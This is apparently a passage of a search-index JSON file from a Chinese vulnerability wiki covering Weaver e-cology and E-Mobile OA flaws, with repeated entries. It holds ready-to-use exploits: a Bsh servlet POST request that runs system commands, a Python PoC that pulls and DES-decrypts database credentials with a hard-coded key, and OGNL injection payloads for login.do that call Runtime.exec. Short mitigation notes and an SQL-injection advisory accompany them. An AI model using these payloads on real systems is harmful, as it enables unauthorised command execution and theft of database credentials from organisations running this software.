bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw ```\u9632\u62a4\u65b9\u6cd5 1.\u53ca\u65f6\u66f4\u65b0\u6cdb\u5fae\u8865\u4e01 2.\u62e6\u622a/weaver/bsh.servlet.BshServlet\u76ee\u5f55\u7684\u8bbf\u95ee","title":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"\u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd","title":"\u8be6\u60c5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"``` POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw ```\u9632\u62a4\u65b9\u6cd5 1.\u53ca\u65f6\u66f4\u65b0\u6cdb\u5fae\u8865\u4e01 2.\u62e6\u622a/weaver/bsh.servlet.BshServlet\u76ee\u5f55\u7684\u8bbf\u95ee","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/","text":"\u5f71\u54cd\u7248\u672c \u00b6 \u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531\uff0c\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0 \u6f0f\u6d1e\u9a8c\u8bc1POC \u00b6 # -*- coding:utf-8 -*- #Author:print(\"\") import pyDes,requests import sys def desdecode(secret_key,s): cipherX = pyDes.des(' ') cipherX.setKey(secret_key) y = cipherX.decrypt(s) return y default_headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' } def send(url): data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content return (desdecode('1z2x3c4v5b6n', data.strip())) if __name__ == '__main__': url = sys.argv[1] print('\u6cdb\u5faee-cology OA \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e') print('url--->%s'%url) print('\u6570\u636e\u5e93\u4fe1\u606f\u5982\u4e0b----->:%s'%send(url))","title":"\u6cdb\u5faeOA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#_1","text":"\u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531\uff0c\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#poc","text":"# -*- coding:utf-8 -*- #Author:print(\"\") import pyDes,requests import sys def desdecode(secret_key,s): cipherX = pyDes.des(' ') cipherX.setKey(secret_key) y = cipherX.decrypt(s) return y default_headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' } def send(url): data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content return (desdecode('1z2x3c4v5b6n', data.strip())) if __name__ == '__main__': url = sys.argv[1] print('\u6cdb\u5faee-cology OA \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e') print('url--->%s'%url) print('\u6570\u636e\u5e93\u4fe1\u606f\u5982\u4e0b----->:%s'%send(url))","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"2019\u5e7410\u6708\uff0c\u767d\u5e3d\u6c47\u5b89\u5168\u7814\u7a76\u9662\u89c2\u6d4b\u5916\u7f51\u51fa\u73b0\u6cdb\u5fae\u529e\u516c\u8f6f\u4ef6\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u653b\u51fb\uff0c\u83b7\u5f97\u7cfb\u7edf\u654f\u611f\u6570\u636e\u3002\u8be5\u6f0f\u6d1e\u76ee\u524d\u5c5e\u4e8e0day\uff0c\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u7f51\u7ad9\u90fd\u6709\u53ef\u80fd\u53d7\u5230\u5f71\u54cd\uff0c\u4e14\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u5371\u5bb3\u5927\uff08\u53ef\u83b7\u53d6\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\uff09\uff0c\u9884\u8ba1\u4f1a\u5bf9\u6cdb\u5fae\u7684\u4e3b\u8981\u670d\u52a1\u5730\u533a\u2014\u2014\u4e2d\u56fd\u5e02\u573a\u4ea7\u751f\u4e00\u5b9a\u51b2\u51fb\u3002 \u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684 WorkflowCenterTreeData \u63a5\u53e3\u4e2d\u6d89\u53caOracle\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\u7f3a\u4e4f\u5b89\u5168\u68c0\u67e5\u63aa\u65bd\u6240\u5bfc\u81f4\u7684\uff0c\u4efb\u610f\u653b\u51fb\u8005\u90fd\u53ef\u501fSQL\u8bed\u53e5\u62fc\u63a5\u65f6\u673a\u6ce8\u5165\u6076\u610fpayload\uff0c\u9020\u6210SQL\u6ce8\u5165\u653b\u51fb\u3002\u76ee\u524d\u5b98\u65b9\u5c1a\u672a\u53d1\u5e03\u6f0f\u6d1e\u8865\u4e01\uff0c\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u7f51\u7ad9\u90fd\u6709\u53ef\u80fd\u53d7\u5230\u5f71\u54cd\uff0c\u8bf7\u76f8\u5173\u7f51\u7ad9\u7ba1\u7406\u4eba\u5458\u5728\u5b98\u65b9\u53d1\u5e03\u8865\u4e01\u524d\u53ca\u65f6\u4e0b\u7ebf\u7f51\u7ad9\u3002 \u6982\u51b5 \u00b6 \u76ee\u524dFOFA\u7cfb\u7edf\u6700\u65b0\u6570\u636e\uff08\u4e00\u5e74\u5185\u6570\u636e\uff09\u663e\u793a\u5168\u7403\u8303\u56f4\u5185\u5171\u670910266\u4e2a\u6cdb\u5fae\u670d\u52a1\uff08\u57fa\u4e8ejsp\u8bed\u8a00\uff09\u3002\u4e2d\u56fd\u5927\u9646\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u670910166\u4e2a\uff0c\u4e2d\u56fd\u9999\u6e2f\u7b2c\u4e8c\uff0c\u5171\u670951\u4e2a\uff0c\u7f8e\u56fd\u7b2c\u4e09\uff0c\u5171\u670915\u4e2a\uff0c\u65b0\u52a0\u5761\u7b2c\u56db\uff0c\u5171\u670911\u4e2a\uff0c\u82f1\u56fd\u7b2c\u4e94\uff0c\u5171\u67094\u4e2a\u3002 \u5168\u7403\u8303\u56f4\u5185\u6cdb\u5fae\u670d\u52a1\u5206\u5e03\u60c5\u51b5\u5982\u4e0b\uff08\u4ec5\u4e3a\u5206\u5e03\u60c5\u51b5\uff0c\u975e\u6f0f\u6d1e\u5f71\u54cd\u60c5\u51b5\uff09\u3002 \u4e2d\u56fd\u5927\u9646\u5730\u533a\u5e7f\u4e1c\u7701\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u67091559\u4e2a\uff0c\u56db\u5ddd\u7701\u7b2c\u4e8c\uff0c\u5171\u67091014\u4e2a\uff0c\u6cb3\u5357\u7701\u7b2c\u4e09\uff0c\u5171\u67091008\u4e2a\uff0c\u6c5f\u897f\u7701\u7b2c\u56db\uff0c\u5171\u6709961\u4e2a\uff0c\u4e0a\u6d77\u5e02\u7701\u7b2c\u4e94\uff0c\u5171\u6709811\u4e2a\u3002 \u5371\u5bb3\u7b49\u7ea7 \u00b6 \u4e25\u91cd 12 \u6f0f\u6d1e\u539f\u7406 \u00b6 \u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684 WorkflowCenterTreeData \u63a5\u53e3\u5728\u63a5\u6536\u5230\u7528\u6237\u8f93\u5165\u65f6\u4f1a\u5728\u672a\u7ecf\u8fc7\u5b89\u5168\u8fc7\u6ee4\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u62fc\u63a5\u5230SQL\u8bed\u53e5\u4e2d\uff0c\u9020\u6210SQL\u6ce8\u5165\u3002 \uff08\u4e0a\u56fe\u6765\u6e90\u4e8e\u7f51\u7edc\uff09 \u6f0f\u6d1e\u5f71\u54cd \u00b6 \u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u670d\u52a1\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u3002 \u6f0f\u6d1ePOC \u00b6 \u76ee\u524dFOFA\u5ba2\u6237\u7aef\u5e73\u53f0\u5df2\u7ecf\u66f4\u65b0\u8be5\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u68c0\u6d4bPOC\u3002 POC\u622a\u56fe CVE\u7f16\u53f7 \u00b6 \u6682\u65e0\u7f16\u53f7 12 \u4fee\u590d\u5efa\u8bae \u00b6 \u7531\u4e8e\u76ee\u524d\u6ca1\u6709\u5b98\u65b9\u8865\u4e01\uff0c\u8bf7\u4f7f\u7528\u4e86\u6cdb\u5fae\u529e\u516c\u8f6f\u4ef6\u4e14\u540e\u7aef\u6570\u636e\u5e93\u662fOracle\u7684\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\u53ca\u65f6\u4e0b\u7ebf\u7f51\u7ad9\u3002 \u53c2\u8003 \u00b6 [1] https://www.weaver.com.cn/ [2] https://baike.baidu.com/item/%E6%B3%9B%E5%BE%AE/426156?fr=aladdin \u767d\u5e3d\u6c47\u4ece\u4e8b\u4fe1\u606f\u5b89\u5168\uff0c\u4e13\u6ce8\u4e8e\u5b89\u5168\u5927\u6570\u636e\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3002 \u516c\u53f8\u4ea7\u54c1\uff1aFOFA-\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u641c\u7d22\u5f15\u64ce\u3001FOEYE-\u7f51\u7edc\u7a7a\u95f4\u68c0\u7d22\u7cfb\u7edf\u3001NOSEC-\u5b89\u5168\u8baf\u606f\u5e73\u53f0\u3002 \u4e3a\u60a8\u63d0\u4f9b\uff1a\u7f51\u7edc\u7a7a\u95f4\u6d4b\u7ed8\u3001\u4f01\u4e1a\u8d44\u4ea7\u6536\u96c6\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3001\u5e94\u6025\u54cd\u5e94\u670d\u52a1\u3002","title":"\u6cdb\u5faee cology SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"\u76ee\u524dFOFA\u7cfb\u7edf\u6700\u65b0\u6570\u636e\uff08\u4e00\u5e74\u5185\u6570\u636e\uff09\u663e\u793a\u5168\u7403\u8303\u56f4\u5185\u5171\u670910266\u4e2a\u6cdb\u5fae\u670d\u52a1\uff08\u57fa\u4e8ejsp\u8bed\u8a00\uff09\u3002\u4e2d\u56fd\u5927\u9646\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u670910166\u4e2a\uff0c\u4e2d\u56fd\u9999\u6e2f\u7b2c\u4e8c\uff0c\u5171\u670951\u4e2a\uff0c\u7f8e\u56fd\u7b2c\u4e09\uff0c\u5171\u670915\u4e2a\uff0c\u65b0\u52a0\u5761\u7b2c\u56db\uff0c\u5171\u670911\u4e2a\uff0c\u82f1\u56fd\u7b2c\u4e94\uff0c\u5171\u67094\u4e2a\u3002 \u5168\u7403\u8303\u56f4\u5185\u6cdb\u5fae\u670d\u52a1\u5206\u5e03\u60c5\u51b5\u5982\u4e0b\uff08\u4ec5\u4e3a\u5206\u5e03\u60c5\u51b5\uff0c\u975e\u6f0f\u6d1e\u5f71\u54cd\u60c5\u51b5\uff09\u3002 \u4e2d\u56fd\u5927\u9646\u5730\u533a\u5e7f\u4e1c\u7701\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u67091559\u4e2a\uff0c\u56db\u5ddd\u7701\u7b2c\u4e8c\uff0c\u5171\u67091014\u4e2a\uff0c\u6cb3\u5357\u7701\u7b2c\u4e09\uff0c\u5171\u67091008\u4e2a\uff0c\u6c5f\u897f\u7701\u7b2c\u56db\uff0c\u5171\u6709961\u4e2a\uff0c\u4e0a\u6d77\u5e02\u7701\u7b2c\u4e94\uff0c\u5171\u6709811\u4e2a\u3002","title":"\u6982\u51b5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","text":"\u4e25\u91cd 12","title":"\u5371\u5bb3\u7b49\u7ea7"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","text":"\u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684 WorkflowCenterTreeData \u63a5\u53e3\u5728\u63a5\u6536\u5230\u7528\u6237\u8f93\u5165\u65f6\u4f1a\u5728\u672a\u7ecf\u8fc7\u5b89\u5168\u8fc7\u6ee4\u7684\u60c5\u51b5\u4e0b\u76f4\u63a5\u62fc\u63a5\u5230SQL\u8bed\u53e5\u4e2d\uff0c\u9020\u6210SQL\u6ce8\u5165\u3002 \uff08\u4e0a\u56fe\u6765\u6e90\u4e8e\u7f51\u7edc\uff09","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","text":"\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u670d\u52a1\u90fd\u6709\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","text":"\u76ee\u524dFOFA\u5ba2\u6237\u7aef\u5e73\u53f0\u5df2\u7ecf\u66f4\u65b0\u8be5\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u68c0\u6d4bPOC\u3002 POC\u622a\u56fe","title":"\u6f0f\u6d1ePOC"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#cve","text":"\u6682\u65e0\u7f16\u53f7 12","title":"CVE\u7f16\u53f7"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_5","text":"\u7531\u4e8e\u76ee\u524d\u6ca1\u6709\u5b98\u65b9\u8865\u4e01\uff0c\u8bf7\u4f7f\u7528\u4e86\u6cdb\u5fae\u529e\u516c\u8f6f\u4ef6\u4e14\u540e\u7aef\u6570\u636e\u5e93\u662fOracle\u7684\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\u53ca\u65f6\u4e0b\u7ebf\u7f51\u7ad9\u3002","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_6","text":"[1] https://www.weaver.com.cn/ [2] https://baike.baidu.com/item/%E6%B3%9B%E5%BE%AE/426156?fr=aladdin \u767d\u5e3d\u6c47\u4ece\u4e8b\u4fe1\u606f\u5b89\u5168\uff0c\u4e13\u6ce8\u4e8e\u5b89\u5168\u5927\u6570\u636e\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3002 \u516c\u53f8\u4ea7\u54c1\uff1aFOFA-\u7f51\u7edc\u7a7a\u95f4\u5b89\u5168\u641c\u7d22\u5f15\u64ce\u3001FOEYE-\u7f51\u7edc\u7a7a\u95f4\u68c0\u7d22\u7cfb\u7edf\u3001NOSEC-\u5b89\u5168\u8baf\u606f\u5e73\u53f0\u3002 \u4e3a\u60a8\u63d0\u4f9b\uff1a\u7f51\u7edc\u7a7a\u95f4\u6d4b\u7ed8\u3001\u4f01\u4e1a\u8d44\u4ea7\u6536\u96c6\u3001\u4f01\u4e1a\u5a01\u80c1\u60c5\u62a5\u3001\u5e94\u6025\u54cd\u5e94\u670d\u52a1\u3002","title":"\u53c2\u8003"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/","text":"\u6cdb\u5faee-mobile ognl\u6ce8\u5165 \u00b6 \u6cdb\u5fae E-Mobile \u8868\u8fbe\u5f0f\u6ce8\u5165?\u5927\u6982?\u8fd9\u4e2a\u6d1e\u662f\u4e00\u4e2a\u6708\u4ee5\u524d\uff0c\u8001\u5e08\u4e22\u7ed9\u6211\u73a9\u7684\uff0c\u53eb\u6211\u5b66\u4e60\u4e00\u4e0b\u3002 \u62ff\u5230\u7684\u65f6\u5019\u4e00\u8138\u61f5\u903c\uff0c\u4ec0\u4e48\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165?\u53bb\u6f0f\u6d1e\u5e93\u770b\u4e86\u4e00\u5708\u3002 (\u30fb\u3002\u30fb) \u5662\uff01\u539f\u6765\u53ef\u4ee5\u6267\u884c\u7b97\u672f\u8fd0\u7b97\u5c31\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165\u5440\uff01 \u8981\u600e\u4e48\u73a9\uff1f\u5f53\u8ba1\u7b97\u5668\u7528\u4e48\uff1f\uff5e\u30fe(*\u00b4\u2207`)\uff89 \u4e00\u3001\u6cdb\u5faeOA E-Mobile WebServer: Apache \u901a\u7528\u90e8\u5206: apache \u5b98\u65b9\u6709\u4e24\u4e2aOA\u3002\u4e00\u4e2a\u662f**apache**\u7684 \u4e00\u4e2a\u662f**Resin**\u7684\u3002 **Resin**\u7684\u4e5f\u627e\u5230\u59ff\u52bf\u901a\u6740\u4e86\uff0c\u4f46\u662f**Resin**\u6d89\u53ca\u7684\u7ad9\u592a\u5927\u4e86\u3002\u3002\u3002\u6682\u65f6\u4e0d\u653e\u51fa\u6765\uff0c\u56e0\u4e3a\u597d\u50cf\u548cS2\u649e\u6d1e\u4e86\uff1f\u56e0\u4e3a045\u6253\u4e86WAF\u7684 \uff0c\u6211\u8fd9\u4e2a\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u300223333 \u6211\u4e5f\u4e0d\u77e5\u9053~ 1\u3001\u767b\u5f55\u9875\u9762\u5982\u4e0b http://6.6.6.6/login.do? or http://6.6.6.6/login/login.do? 2\u3001\u5f53\u8d26\u53f7\u5bc6\u7801\u62a5\u9519\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u5982\u4e0bURL login.do?message=104&verify= 3\u3001\u76f4\u63a5\u6539\u5199message=\u7684\u5185\u5bb9\uff0c\u8bd5\u8bd5\u7b97\u672f\u8fd0\u7b97\u3002 http://6.6.6.6/login.do?message=66*66*66-66666 4\u3001\u8868\u8fbe\u5f0f\u6ce8\u5165\u3002 \u6709\u7684\u8868\u8fbe\u5f0f\u6ce8\u5165\u662f${code}\u3002\u8fd9\u91cc\u9690\u85cf\u4e86${}\uff0c\u6240\u4ee5\u76f4\u63a5\u8c03\u7528\u5c31\u884c\u4e86\u3002 message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 5\u3001\u4e5f\u53ef\u4ee5\u901a\u8fc7`post`\u63d0\u4ea4\u6570\u636e\u6765\u8fdb\u884c\u6ce8\u5165\uff0c\u547d\u4ee4\u6267\u884c `post`\u5982\u4e0b\u6570\u636e\u4e5f\u53ef\u4ee5\uff1a message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami ==================================================================== \u7f51\u7edc\u5b9e\u4f8b \u6b64\u7248\u672c\u4e3a5.0 \u9996\u5148\u968f\u4fbf\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u770b\u63d0\u793a\u4fe1\u606f \u63d0\u793a\u4e3a104\uff0c\u5730\u5740\u680fmessage\u4e5f\u663e\u793a\u4e86104,\u73b0\u5728\u6d4b\u8bd5\u4e00\u4e0b\u770b\u770b\u6709\u6ca1\u6709\u6ce8\u5165 \u76f4\u63a5\u83b7\u53d6\u6570\u636e\u6cd5: \u52a0\u51cf\u4e58\u9664 \u8868\u8fbe\u5f0f\u83b7\u53d6\u6570\u636e\u8bed\u6cd5\uff1a\" \\({\u6807\u8bc6\u7b26}\"\uff0c\u4f46\u5728\u8fd9\u4e2a\u4e2d\u5e76\u4e0d\u9700\u8981\\) \u6765\u5305\u62ec http://www.xxx.com/login.do?message=104-2&verify= \u7ed3\u679c\u53ef\u4ee5\u88ab\u6267\u884c\u6210\u529f\uff0c\u8868\u793a\u6f0f\u6d1e\u5b58\u5728\u53ef\u6ce8\u5165 \u8fd9\u91cc\u6709\u4e24\u4e2apoc\u53ef\u5229\u7528 message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())\u4e0b\u9762\u9700\u8981Post\u8bf7\u6c42message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami","title":"\u6cdb\u5faee mobile ognl\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5/#e-mobile-ognl","text":"\u6cdb\u5fae E-Mobile \u8868\u8fbe\u5f0f\u6ce8\u5165?\u5927\u6982?\u8fd9\u4e2a\u6d1e\u662f\u4e00\u4e2a\u6708\u4ee5\u524d\uff0c\u8001\u5e08\u4e22\u7ed9\u6211\u73a9\u7684\uff0c\u53eb\u6211\u5b66\u4e60\u4e00\u4e0b\u3002 \u62ff\u5230\u7684\u65f6\u5019\u4e00\u8138\u61f5\u903c\uff0c\u4ec0\u4e48\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165?\u53bb\u6f0f\u6d1e\u5e93\u770b\u4e86\u4e00\u5708\u3002 (\u30fb\u3002\u30fb) \u5662\uff01\u539f\u6765\u53ef\u4ee5\u6267\u884c\u7b97\u672f\u8fd0\u7b97\u5c31\u662f\u8868\u8fbe\u5f0f\u6ce8\u5165\u5440\uff01 \u8981\u600e\u4e48\u73a9\uff1f\u5f53\u8ba1\u7b97\u5668\u7528\u4e48\uff1f\uff5e\u30fe(*\u00b4\u2207`)\uff89 \u4e00\u3001\u6cdb\u5faeOA E-Mobile WebServer: Apache \u901a\u7528\u90e8\u5206: apache \u5b98\u65b9\u6709\u4e24\u4e2aOA\u3002\u4e00\u4e2a\u662f**apache**\u7684 \u4e00\u4e2a\u662f**Resin**\u7684\u3002 **Resin**\u7684\u4e5f\u627e\u5230\u59ff\u52bf\u901a\u6740\u4e86\uff0c\u4f46\u662f**Resin**\u6d89\u53ca\u7684\u7ad9\u592a\u5927\u4e86\u3002\u3002\u3002\u6682\u65f6\u4e0d\u653e\u51fa\u6765\uff0c\u56e0\u4e3a\u597d\u50cf\u548cS2\u649e\u6d1e\u4e86\uff1f\u56e0\u4e3a045\u6253\u4e86WAF\u7684 \uff0c\u6211\u8fd9\u4e2a\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u300223333 \u6211\u4e5f\u4e0d\u77e5\u9053~ 1\u3001\u767b\u5f55\u9875\u9762\u5982\u4e0b http://6.6.6.6/login.do? or http://6.6.6.6/login/login.do? 2\u3001\u5f53\u8d26\u53f7\u5bc6\u7801\u62a5\u9519\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u5982\u4e0bURL login.do?message=104&verify= 3\u3001\u76f4\u63a5\u6539\u5199message=\u7684\u5185\u5bb9\uff0c\u8bd5\u8bd5\u7b97\u672f\u8fd0\u7b97\u3002 http://6.6.6.6/login.do?message=66*66*66-66666 4\u3001\u8868\u8fbe\u5f0f\u6ce8\u5165\u3002 \u6709\u7684\u8868\u8fbe\u5f0f\u6ce8\u5165\u662f${code}\u3002\u8fd9\u91cc\u9690\u85cf\u4e86${}\uff0c\u6240\u4ee5\u76f4\u63a5\u8c03\u7528\u5c31\u884c\u4e86\u3002 message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 5\u3001\u4e5f\u53ef\u4ee5\u901a\u8fc7`post`\u63d0\u4ea4\u6570\u636e\u6765\u8fdb\u884c\u6ce8\u5165\uff0c\u547d\u4ee4\u6267\u884c `post`\u5982\u4e0b\u6570\u636e\u4e5f\u53ef\u4ee5\uff1a message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami ==================================================================== \u7f51\u7edc\u5b9e\u4f8b \u6b64\u7248\u672c\u4e3a5.0 \u9996\u5148\u968f\u4fbf\u8f93\u5165\u8d26\u53f7\u5bc6\u7801\u770b\u63d0\u793a\u4fe1\u606f \u63d0\u793a\u4e3a104\uff0c\u5730\u5740\u680fmessage\u4e5f\u663e\u793a\u4e86104,\u73b0\u5728\u6d4b\u8bd5\u4e00\u4e0b\u770b\u770b\u6709\u6ca1\u6709\u6ce8\u5165 \u76f4\u63a5\u83b7\u53d6\u6570\u636e\u6cd5: \u52a0\u51cf\u4e58\u9664 \u8868\u8fbe\u5f0f\u83b7\u53d6\u6570\u636e\u8bed\u6cd5\uff1a\" 